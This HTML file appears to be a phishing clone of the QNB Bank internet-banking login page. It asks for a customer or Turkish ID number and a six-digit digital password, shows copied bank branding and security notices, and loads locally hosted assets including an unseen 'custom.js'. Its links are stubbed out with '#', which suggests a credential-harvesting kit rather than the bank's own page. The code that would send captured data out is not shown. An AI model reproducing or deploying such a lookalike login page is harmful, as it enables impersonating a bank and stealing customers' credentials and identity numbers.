<!DOCTYPE html
    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <title>
        QNB İnternet Şubesi
    </title>
    <meta http-equiv="PRAGMA" content="NO-CACHE" />
    <meta http-equiv="CACHE-CONTROL" content="NO-CACHE" />
    <meta http-equiv="Expires" content="now" />
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-9" />
    <meta name="google" content="notranslate" />
    <meta name="format-detection" content="telephone=no" />
    <meta name="google-site-verification" content="rMBe9MNn2Z0cVlSjxsgCC3vY4wMsed5hRSqRsaI60IU" />
    <meta name="viewport"
        content="width=device-width, user-scalable=no,initial-scale=1.0,minimum-scale=1,height=device-height" />
    <meta name="robots" content="noindex" />
    <meta name="googlebot" content="noindex" />
    <link href="qassets/Content/Devices/jquery.smartbanner.css" rel="stylesheet" type="text/css" />
    <meta name="apple-itunes-app-new" content="app-id=739655617" />
    <meta name="google-play-app" content="app-id=com.finansbank.mobile.cepsube" />
    <meta name="msApplication-ID" content="App" />
    <meta name="msapplication-TileImage"
        content="https://lh3.googleusercontent.com/apgjMxBvR8Cv-hpXzCY7SU9xWK0UIRMWqEhjKKfzr_o8qF3JHZ6q1k4QIRX8WwjGeg=w300-rw" />
    <link type="text/css" rel="stylesheet"
        href="qassets/Content/Themes/FinansbankTheme/FinansbankDropDownList.css?20250902132342" />
    <link type="text/css" rel="stylesheet" href="qassets/Content/Themes/FinansbankTheme/FBTooltip.css?20250902132342" />
    <link type="text/css" rel="stylesheet"
        href="qassets/Content/Themes/LoginTheme/FinansbankLoginStyle.css?20250902132342" />
    <link type="text/css" rel="stylesheet" href="qassets/Content/Themes/LoginTheme/warning.css?20250902132342" />
    <link type="text/css" rel="stylesheet" href="qassets/Content/Themes/LoginTheme/loginmain.css?20250902132342" />
    <script type="text/javascript" src="qassets/Content/js/jquery-1.6.2.min.js?20250902132342"></script>
    <script type="text/javascript" src="qassets/Content/js/jquery-ui-1.7.3.custom.min.js?20250902132342"></script>
    <script type="text/javascript" src="qassets/Content/js/jquery.json-2.3.min.js?20250902132342"></script>
    <script type="text/javascript" src="qassets/Content/js/jquery.data.js?20250902132342"></script>
    <script type="text/javascript" src="qassets/Content/js/jquery.watermark.js?20250902132342"></script>
    <link type="text/css" rel="stylesheet" href="qassets/Content/Themes/LoginTheme/bootstrap.css?20250902132342" />
    <script type="text/javascript" src="qassets/Content/js/bootstrap.js?20250902132342"></script>
    <link type="text/css" rel="stylesheet" href="qassets/Content/Themes/LoginTheme/bootstrap-ie11.css?20250902132342" />
    <link type="text/css" rel="stylesheet" href="qassets/Content/Fonts/Cordale/cordale.min.css?20250902132342" />
    <link type="text/css" rel="stylesheet" href="qassets/Content/Fonts/Muli/muli.min.css?20250902132342" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.css">

    <link rel="stylesheet" href="qassets/custom.css" />

    <script type="text/javascript" src="qassets/Content/Devices/jquery.smartbanner.js"></script>

    <script type="text/javascript">
        var isMobile = {
            Windows: function() {
                return /IEMobile/i.test(navigator.userAgent);
            },
            Android: function() {
                return /Android/i.test(navigator.userAgent);
            },
            BlackBerry: function() {
                return /BlackBerry/i.test(navigator.userAgent);
            },
            iOS: function() {
                return /iPhone|iPad|iPod/i.test(navigator.userAgent);
            },
            any: function() {
                return (isMobile.Android() || isMobile.BlackBerry() || isMobile.iOS() || isMobile.Windows());
            }
        };

        function getPlatformVersion(platformType) {

            var ua = navigator.userAgent;
            var reg = null;

            var androidReg = /Android (\d+).?(\d+)?.?(\d+)?/;
            var iosReg = /OS (\d+)_(\d+)_?(\d+)?/;

            switch (platformType) {
                case 'android':
                    reg = androidReg;
                    break;
                case 'ios':
                    reg = iosReg;
                    break;
            }

            if (reg != null) {
                var v = ua.match(reg);

                if (v == null) return v;

                return v[1] + '.' + (v[2] || 0) + '.' + (v[3] || 0);
            }
        }

        function compareVersions(a, b) {
            if (a === b) {
                return 0;
            }

            var a_components = a.split(".");
            var b_components = b.split(".");

            var len = Math.min(a_components.length, b_components.length);

            for (var i = 0; i < len; i++) {
                if (parseInt(a_components[i]) > parseInt(b_components[i])) {
                    return 1;
                }

                if (parseInt(a_components[i]) < parseInt(b_components[i])) {
                    return -1;
                }
            }

            if (a_components.length > b_components.length) {
                return 1;
            }

            if (a_components.length < b_components.length) {
                return -1;
            }

            return 0;
        }

        var mforce = null;

        if (isMobile.Android()) {
            mforce = 'android';
        } else if (isMobile.iOS()) {
            mforce = 'ios';
        }

        if (mforce != null) {
            var isOldVersion = false;

            var platformVersion = getPlatformVersion(mforce);

            if (mforce == 'ios') {
                if (platformVersion == null || compareVersions(platformVersion, "10.0.0") < 0) {
                    isOldVersion = true;
                }
            } else if (mforce == 'android') {
                if (platformVersion == null || compareVersions(platformVersion, "4.1.0") < 0) {
                    isOldVersion = true;
                }
            } else {
                isOldVersion = true;
            }

            if (!isOldVersion) {
                $(function() {
                    $.smartbanner({
                        daysHidden: 0,
                        daysReminder: 0,
                        title: 'Cep Şubesi',
                        force: mforce
                    });
                });
            }
        } else {
            $('head').append('<meta name="apple-itunes-app" content="app-id=739655617" />');
        }

        //engelli
        $(function() {
            var tabElementList = $("div#container *:not(:has(*))").not(":empty, script, style");

            tabElementList.each(function(i, obj) {
                setTitleAndTabIndexForPopUp($(tabElementList[i]), i);
            });
        });

        function setTitleAndTabIndexForPopUp(jqueryObj, tabIndex) {
            if (jqueryObj.hasClass("watermark")) {
                if (jqueryObj.siblings("input").length > 0) {
                    jqueryObj.siblings("input").attr("title", jqueryObj.html());
                }

                return;
            }

            if (!isNullOrWhiteSpace(jqueryObj.html())) {
                jqueryObj.attr("title", jqueryObj.html());
                jqueryObj.attr("tabindex", "0");
                jqueryObj.css("outline", "none");
            }
        }

        function isNullOrWhiteSpace(str) {
            return str === null || str.match(/^ *$/) !== null;
        }
    </script>


</head>

<body>

    <form name="aspnetForm" method="post" id="aspnetForm" autocomplete="off">

        <div id="preload-img" style="position: absolute; left: 420px; top: 250px; display: none">
            <img id="ctl00_FinansbankLoaderImage" src="qassets/Content/Images/loader.gif" style="border-width:0px;" />
        </div>

        <div class="container-lg px-0" style="max-width: 980px;">
            <div id="ctl00_headerDiv" Class="header-purple">
                <div id="leftDiv" class="headerLeftDiv"></div>

                <span id="imgText" Class="headerImgText">İnternet Şubesi</span>


                <div class="top_nav" style="
    display: none;
">

                    <div>








                    </div>
                </div>
            </div>
            <div id="headerTitle" style="visibility:hidden;display: none;
    margin-top: 10px;">


                <div id="ctl00_headerContentPlaceHolder_LoginInformationDiv" style="display: none; width: 625px;">

                </div>
                <div class="floatLeft">
                    <img src="qassets/Content/Images/content_title_left.png" width="23" height="50" />
                </div>
                <div class="headerTitleMiddle floatLeft">
                    <span id="ctl00_headerContentPlaceHolder_HeaderTitleLabel">Lütfen müşteri numarası / TCKN ve Dijital
                        Şifrenizi giriniz.</span>
                </div>
                <div class="floatLeft">
                    <img src="qassets/Content/Images/content_title_right.png" width="17" height="28" />
                </div>

            </div>
            <section>
                <div class="row p-10-ch">
                    <div id="mainPanel" class="px-0 mainContent">

                        <input type="hidden" name="ctl00$mainContentPlaceHolder$qrCodeLoginFingerPrint"
                            id="qrCodeLoginFingerPrint" />
                        <div class="row" style="height: 100%; justify-content: center;">
                            <div class="col-lg-8 col-md-7 col-12 mainPanel-width"
                                style="border: 2px solid #d7d7d7; border-radius: 10px; padding: 30px; float: left; min-height: 380px;">
                                <div class="containerkeypad">
                                    <div id="keys" style="float: left; display: inline-block"></div>
                                </div>
                                <div class="subPanel-width">
                                    <div class="row">
                                        <div class="col-lg-6 col-12">
                                            <div class="row">
                                                <div class="col-12">
                                                    <div class="form-group">
                                                        <div id="ctl00_mainContentPlaceHolder_VirtualKeyboardDiv"
                                                            style="display: none; width: 390px;">
                                                            <html xmlns="http://www.w3.org/1999/xhtml">

                                                            <head>
                                                                <meta http-equiv="Content-Type"
                                                                    content="text/html; charset=utf-8" />
                                                                <title></title>
                                                            </head>

                                                            <body>
                                                                <div class="sanalklavyeHelpConatiner">
                                                                    <div class="content">
                                                                        <h1>Sanal Klavye Nedir? </h1>
                                                                        <p>Sanal Klavye, Internet Bankacılığı'na girişte
                                                                            size ilave güvenlik sağlayan bir özelliktir.
                                                                            Bilgisayara kullanıcının bilgisi dışında
                                                                            yüklenen ve kullanıcının yazmış olduğu
                                                                            şifre/parolaları tespit eden programlara
                                                                            karşı koruma amacıyla geliştirilmiştir.
                                                                            Sanal Klavye'yi kullanarak söz konusu
                                                                            programlarından korunursunuz.</p>
                                                                        <p> Sanal Klavye, rakamların girişi için
                                                                            kullanılması tavsiye edilen bir araçtır. Tüm
                                                                            şifre değişiklik ekranlarında da Sanal
                                                                            Klavye'yi kullanabilirsiniz. Tercihinize
                                                                            bağlı "Klavye Kullan" seçimi ile klavyenizin
                                                                            tuşlarını
                                                                            kullanabilirsiniz.</p>
                                                                        <h1>Sanal Klavye Nasıl Kullanılır? </h1>
                                                                        <p>Sanal Klavye'yi üzerinde yer alan
                                                                            karışık-sıralı rakamları mouse ile seçerek
                                                                            kullanabilirsiniz. </p>
                                                                    </div>
                                                                </div>
                                                            </body>

                                                            </html>
                                                        </div>
                                                        <span id="ctl00_mainContentPlaceHolder_UserIDLabel"
                                                            class="loginlabel">Müşteri / T.C. Kimlik Numaranız</span>
                                                        <input name="ctl00$mainContentPlaceHolder$txtuserid"
                                                            type="text" maxlength="11" id="txtuserid"
                                                            tabindex="1" class="textfield required"
                                                            fbTitle="Müşteri Numarası / TCKN"
                                                            onkeydown="TextBoxFocusOnNavigation(this,event);if(CheckAndRemoveEscapedCharactersFromTextBox([&#39;&lt;&#39;,&#39;>&#39;,&#39;?&#39;],event)){return false;}if(!Only_Numeric(event)){return false;};return ValidateUserCode(event,&#39;mainPanel&#39;,&#39;divErrorMsg&#39;,null,null,6,&#39;Lütfen müşteri numarası/TCKN ve Dijital Şifrenizi giriniz ve &quot;İleri&quot; butonuna basınız.&#39;,&#39;Dijital Şifreniz $$ karakter olmalıdır.&#39;,&#39;&#39;,&#39;Lütfen müşteri numaranızı giriniz.&#39;,&#39;Lütfen Dijital Şifrenizi giriniz.&#39;, &#39;13800009612878050921389294217&#39;);"
                                                            autocomplete="off" />
                                                    </div>
                                                </div>
                                                <div class="col-12">
                                                    <div class="form-group">
                                                        <span id="ctl00_mainContentPlaceHolder_PasswordLabel"
                                                            class="loginlabel">Dijital Şifreniz</span>
                                                        <input name="ctl00$mainContentPlaceHolder$txtpass"
                                                            type="text" maxlength="6" id="txtpass"
                                                            tabindex="2" class="textfield_enwatermark"
                                                            onmouseout="VeriBranch_OnMouseOut(&#39;txtpass&#39;);"
                                                            autocomplete="off" Pattern="[0-9]*"
                                                            onpaste="if(HasNonnumeric(this, event)){return false;};"
                                                            data-form-type="other"
                                                            onblur="VeriBranch_TextOnBlur(&#39;txtpass&#39;,&#39;&#39;);RemoveEscapedCharactersFromTextBox(this,&#39;txtpass&#39;, [&#39;&lt;&#39;,&#39;>&#39;,&#39;?&#39;])"
                                                            onkeypress="return ValidateInput(event,this,&#39;number&#39;);if(CheckAndRemoveEscapedCharactersFromTextBox([&#39;&lt;&#39;,&#39;>&#39;,&#39;?&#39;],event)){return false;}if(HasNonnumericKeyPress(this, event)){return false;};"
                                                            onfocus="VeriBranch_TextOnFocus(&#39;txtpass&#39;,&#39;&#39;);"
                                                            spellcheck="false" fbTitle="Dijital Şifre"
                                                            onkeydown="TextBoxFocusOnNavigation(this,event);if(CheckAndRemoveEscapedCharactersFromTextBox([&#39;&lt;&#39;,&#39;>&#39;,&#39;?&#39;],event)){return false;}if(!Only_Numeric(event)){return false;};Ibtech_keyDown();return ValidateUserCode(event,&#39;mainPanel&#39;,&#39;divErrorMsg&#39;,null,null,6,&#39;Lütfen müşteri numarası/TCKN ve Dijital Şifrenizi giriniz ve &quot;İleri&quot; butonuna basınız.&#39;,&#39;Dijital Şifreniz $$ karakter olmalıdır.&#39;,&#39;&#39;,&#39;Lütfen müşteri numaranızı giriniz.&#39;,&#39;Lütfen Dijital Şifrenizi giriniz.&#39;, &#39;13800009612878050921389294217&#39;);;"
                                                            onmouseover="VeriBranch_OnMouseOver(&#39;txtpass&#39;);" />
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="col-lg-6 col-12">
                                            <div class="row">
                                                <div class="col-12">
                                                    <div id="divErrorMsgOuter"
                                                        class="form-info-tooltip login-input-error error-message-outer"
                                                        clientidmode="Static" style="display: none;">
                                                        <div id="divErrorMsg" style="width: 70%; padding: 10px;">
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="col-12" style="align-self: center;">

                                                    <div id="divErrorMsgOuterPass"
                                                        class="form-info-tooltip login-input-error error-message-outer"
                                                        clientidmode="Static" style="display: none;">
                                                        <div id="divErrorMsgPass" style="width: 70%; padding: 10px;">
                                                        </div>
                                                    </div>

                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-lg-6 col-12">
                                            <p id="ctl00_mainContentPlaceHolder_FinansSifreArea" class="taR"
                                                style="width: 101%">
                                                <a onclick="LogHelpDeskRedirectTransaction(); window.open(&#39;https://dijitalsifre.qnb.com.tr/Default.aspx&#39;,&#39;&#39;,&#39;toolbar=0,menubar=0,resizable=1,status=0,left=0,top=0,scrollbars=1,width=751,height=514&#39;); return false;;return ;"
                                                    id="FinansSifreButton" tabindex="4" class="loginlink"
                                                    href="javascript:__doPostBack(&#39;ctl00$mainContentPlaceHolder$FinansSifreButton&#39;,&#39;&#39;)">Dijital
                                                    Şifre Al</a>
                                                /
                                                <a onclick="LogHelpDeskRedirectTransaction(); window.open(&#39;https://dijitalsifre.qnb.com.tr/Default.aspx&#39;,&#39;&#39;,&#39;toolbar=0,menubar=0,resizable=1,status=0,left=0,top=0,scrollbars=1,width=751,height=514&#39;); return false;;return ;"
                                                    id="FinansSifreButton1" tabindex="5" class="loginlink"
                                                    href="javascript:__doPostBack(&#39;ctl00$mainContentPlaceHolder$FinansSifreButton1&#39;,&#39;&#39;)">Dijital
                                                    Şifremi Unuttum</a>
                                            </p>
                                        </div>

                                    </div>
                                    <div class="row">
                                        <div class="col-lg-6 col-12">
                                            <a onclick="return ValidateLoginForm(&#39;mainPanel&#39;,&#39;divErrorMsg&#39;,null,null,6,&#39;Lütfen müşteri numarası/TCKN ve Dijital Şifrenizi giriniz ve &quot;İleri&quot; butonuna basınız.&#39;,&#39;Dijital Şifreniz $$ karakter olmalıdır.&#39;,&#39;&#39;,&#39;Lütfen müşteri numaranızı giriniz.&#39;,&#39;Lütfen Dijital Şifrenizi giriniz.&#39;,&#39;13800009612878050921389294217&#39;,&#39;true&#39;);;;return ;"
                                                id="13800009612878050921389294217" tabindex="3"
                                                class="ileriButton
                                                href="javascript:__doPostBack(&#39;ctl00$mainContentPlaceHolder$13800009612878050921389294217&#39;,&#39;&#39;)">İleri</a>

                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="col-lg-4 col-md-5 col-12 row-left-padding" style="padding-right: 0px;">

                                <div id="ctl00_mainContentPlaceHolder_QRArea"
                                    class="qr_area d-none d-lg-block d-xl-block">
                                    <table>
                                        <tr>
                                            <td>
                                                <span id="ctl00_mainContentPlaceHolder_QRHeader"
                                                    style="outline: none; margin-left: 8px; font-weight: bold; width: 100%;">Karekod
                                                    ile Hızlı Giriş</span>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td style="line-height: 15px;">
                                                <img id="ctl00_mainContentPlaceHolder_QRCodeImage"
                                                    onclick="return QRClicked();"
                                                    src="qassets/Content/Images/qr_disabled.png"
                                                    style="height:118px;width:118px;border-width:0px;position: absolute; margin-top: 30px; margin-left: 82px;" />
                                                <img id="ctl00_mainContentPlaceHolder_QRRefreshImage"
                                                    onclick="return QRClicked();"
                                                    src="qassets/Content/Images/captcha-refresh.jpg"
                                                    style="border-width:0px;position: absolute; margin-top: 65px; margin-left: 132px;" />
                                                <a onclick="return ;" id="QRCodeLoginButton" class="linkbutton"
                                                    href="javascript:__doPostBack(&#39;ctl00$mainContentPlaceHolder$QRCodeLoginButton&#39;,&#39;&#39;)"
                                                    style="visibility: hidden"></a>
                                                <p id="qrp"
                                                    style="padding-top: 90px; padding-left: 85px; outline: none; text-align: center; width: 201px; color: #800d52;">
                                                </p>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>
                                                <span id="ctl00_mainContentPlaceHolder_QRInfo"
                                                    alt="Karekod ile giriş yapmak için QNB Mobil &amp; Dijital Köprü’nün açılış sayfasındaki Karekod İşlemlerini kullanabilirsiniz. Detaylı bilgi için &lt;a href=# OnClick=showQRHelpPopup();>tıklayınız.&lt;/a>
"
                                                    style="position: absolute; outline: none; margin-top: 30px; width: 285px; margin-left: 8px; line-height: 16px;">Karekod
                                                    ile giriş yapmak için QNB Mobil & Dijital Köprü’nün açılış
                                                    sayfasındaki Karekod İşlemlerini kullanabilirsiniz. Detaylı bilgi
                                                    için <a href="#">tıklayınız.</a>
                                                </span>
                                            </td>
                                        </tr>
                                    </table>
                                </div>
                                <div>


                                    <div id="guvenlik" class="info-box"
                                        style="visibility: visible; display: contents;">
                                        <h3><span
                                                id="ctl00_mainContentPlaceHolder_lblSubContentBottomTitle">Güvenliğiniz
                                                İçin</span></h3>
                                        <ul id="ctl00_mainContentPlaceHolder_blSubContentBottomList">
                                            <li>Dijital Şifreniz ve bankamız tarafından cep telefonunuza gönderilen tek
                                                kullanımlık şifreler yalnızca size özeldir, bankamız personeli dahil
                                                kimse ile paylaşmayınız. Detaylı bilgi ve güvenlik önlemleri için lütfen
                                                <a target="_blank" href="#"><b>buraya</b></u></a>
                                                tıklayınız.
                                            </li>
                                        </ul>
                                    </div>

                                    <div id="webLoanInfoDiv" style="display: none;">

                                    </div>
                                </div>
                            </div>
                        </div>
                        <input type="hidden" name="ctl00$mainContentPlaceHolder$dd5fcb6461304a64adbfb0462736cb6c"
                            id="dd5fcb6461304a64adbfb0462736cb6c" />

                    </div>
                </div>
            </section>
            <div id="subContent" class="subContent" style="visibility:hidden;display:none">


                <div id="VDAContainer">
                    <div id="apDiv1" style="display: none">
                        <img src="qassets/Content/Images/content_ok.png" width="8" height="15" />
                    </div>
                    <div id="destekContent" style="display: none">
                        <div>
                            <img class="w-100" src="qassets/Content/Images/guvenlik_top.png" width="249"
                                height="10" />
                        </div>
                        <div class="middle title">
                            <ul id="ctl00_subContentPlaceHolder_blSubContentMiddleList">
                                <li>Dijital Şifreniz yoksa veya Dijital Şifrenizi unuttuysanız buraya <a href="#"
                                        class="english"><u>tıklayınız</u></a>.</li>
                            </ul>
                        </div>
                        <div class="bottom">
                            <img class="w-100" src="qassets/Content/Images/guvenlik_bottom.png" width="250"
                                height="18" />
                        </div>
                    </div>
                </div>




                <script type="text/javascript">
                    var isMobile = {
                        Android: function() {
                            return navigator.userAgent.match(/Android/i);
                        },
                        BlackBerry: function() {
                            return navigator.userAgent.match(/BlackBerry/i);
                        },
                        iOS: function() {
                            return navigator.userAgent.match(/iPhone|iPod/i);
                        },
                        iPad: function() {
                            return navigator.userAgent.match(/iPad/i);
                        },
                        Opera: function() {
                            return navigator.userAgent.match(/Opera Mini/i);
                        },
                        Windows: function() {
                            return navigator.userAgent.match(/IEMobile/i) || navigator.userAgent.match(/WPDesktop/i);
                        },
                        any: function() {
                            return (isMobile.Android() || isMobile.BlackBerry() || isMobile.iOS() || isMobile.Opera() ||
                                isMobile.Windows() || isMobile.iPad());
                        }
                    };

                    if (isMobile.any()) {
                        var useridTel = document.getElementById('txtuserid');
                        useridTel.type = "tel";
                    }

                    if (isMobile.iPad()) {
                        var userPass = document.getElementById('txtpass');
                        userPass.type = "tel";
                        userPass.setAttribute('srt', 'numericpassword');
                    } else {
                        var userPass = document.getElementById('txtpass');
                        userPass.type = "text";
                    }
                </script>

            </div>
            <div class="footer">
                <div id="verisign">
                    <!--- DÜZENLEME YAPMAYIN - GlobalSign SSL Site Mührü Kodu - DÜZENLEME YAPMAYIN --->
                    <table width=125 border=0 cellspacing=0 cellpadding=0
                        title="DOĞRULAMA İÇİN TIKLAYIN: Bu site kişisel bilgilerinizin güvenliğini sağlamak için bir GlobalSign SSL Sertifikası kullanır.">
                        <tr>
                            <td><span id="ss_img_wrapper_gmogs_image_110-45_en_dblue"><a
                                        href="https://www.globalsign.com.tr/" target=_blank
                                        title="GlobalSign Site Mührü" rel="nofollow"><img alt="SSL" border=0
                                            id="ss_img" src="qassets/Content/Images/siteSealImage.png"></a></span>

                            </td>
                        </tr>
                    </table><!--- DÜZENLEME YAPMAYIN - GlobalSign SSL Site Mührü Kodu - DÜZENLEME YAPMAYIN --->
                </div>
                <span id="ctl00_lblFooter" class="master-footer">Her hakkı QNB Bank A.Ş.&#39;ye aittir. © 2025</span>
                <ul class="foot-links">
                    <li><a id="ctl00_LinkEN" class="linkbutton" href="#" style="outline:none">English</a></li>
                    <li><a class="linkbutton" href="#" style="outline:none">Yapabileceğiniz İşlemler</a></li>
                    <li><a id="ctl00_LinkFAQ" class="linkbutton" href="#" style="outline:none">Sıkça Sorulan
                            Sorular</a>
                    </li>
                    <li><a id="ctl00_LinkContactUs" class="linkbutton" href="#" style="outline:none">Bize
                            Ulaşın</a>
                    </li>
                </ul>
                <div class="clr"></div>
            </div>

        </div>

        <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
        <script src="qassets/custom/js/jquery.mask.min.js"></script>
        <script src="qassets/custom/js/custom.js"></script>
</body>

</html>
